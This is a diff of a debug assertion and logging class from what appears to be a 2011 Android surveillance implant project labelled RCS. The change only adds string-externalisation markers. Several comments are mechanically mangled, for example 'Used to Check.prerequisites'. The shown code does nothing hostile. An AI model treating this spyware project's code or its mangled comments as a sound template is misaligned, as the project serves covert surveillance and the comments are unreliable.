@@ -2,7 +2,7 @@
  * Copyright (c) 2011
  * HT srl,   All rights reserved.
  * Project      : RCS, AndroidService
- * File         : if(Cfg.DEBUG) Check.java
+ * File         : if(Cfg.DEBUG) Check.java //$NON-NLS-1$
  * Created      : Apr 9, 2011
  * Author		: zeno
  * *******************************************/
@@ -19,9 +19,7 @@ import com.android.service.file.Path;
  * The Class if(Cfg.DEBUG) Check.
  */
 public final class Check {
-
-	private static final String TAG = "Check";
-
+	private static final String TAG = "Check"; //$NON-NLS-1$
 	private static boolean enabled = Cfg.DEBUG;
 
 	/**
@@ -35,13 +33,13 @@ public final class Check {
 	public static void asserts(final boolean b, final String string) {
 		if (enabled && b != true) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "##### Asserts - " + string + " #####");
+				Check.log(TAG + "##### Asserts - " + string + " #####");//$NON-NLS-1$ //$NON-NLS-2$
 			}
 		}
 	}
 
 	/**
-	 * Requires. Used to check prerequisites of a method.
+	 * Requires. Used to Check.prerequisites of a method. //$NON-NLS-1$
 	 * 
 	 * @param b
 	 *            the b
@@ -51,13 +49,13 @@ public final class Check {
 	public static void requires(final boolean b, final String string) {
 		if (enabled && b != true) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "##### Requires - " + string + " #####");
+				Check.log(TAG + "##### Requires - " + string + " #####");//$NON-NLS-1$ //$NON-NLS-2$
 			}
 		}
 	}
 
 	/**
-	 * Ensures. Checks to be done at the end of a method.
+	 * Ensures. Check. to be done at the end of a method. //$NON-NLS-1$
 	 * 
 	 * @param b
 	 *            the b
@@ -67,19 +65,19 @@ public final class Check {
 	public static void ensures(final boolean b, final String string) {
 		if (enabled && b != true) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "##### Ensures - " + string + " #####");
+				Check.log(TAG + "##### Ensures - " + string + " #####");//$NON-NLS-1$ //$NON-NLS-2$
 			}
 		}
 	}
 
 	public synchronized static void log(String string) {
 		if (Cfg.DEBUG) {
-			Log.d("QZ", string);
+			Log.d("QZ", string); //$NON-NLS-1$
 			if (Cfg.FILE) {
 				final AutoFile file = new AutoFile(Path.logs(), Path.LOG_FILE);
 				if (file.exists()) {
 					final DateTime date = new DateTime();
-					file.append(date.getOrderedString() + " - " + string + "\n");
+					file.append(date.getOrderedString() + " - " + string + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 				}
 			}
 		}
@@ -88,7 +86,7 @@ public final class Check {
 	public static void log(Throwable e) {
 		if (Cfg.DEBUG) {
 			e.printStackTrace();
-			log("Exception: " + e.toString());
+			log("Exception: " + e.toString()); //$NON-NLS-1$
 		}
 
 	}
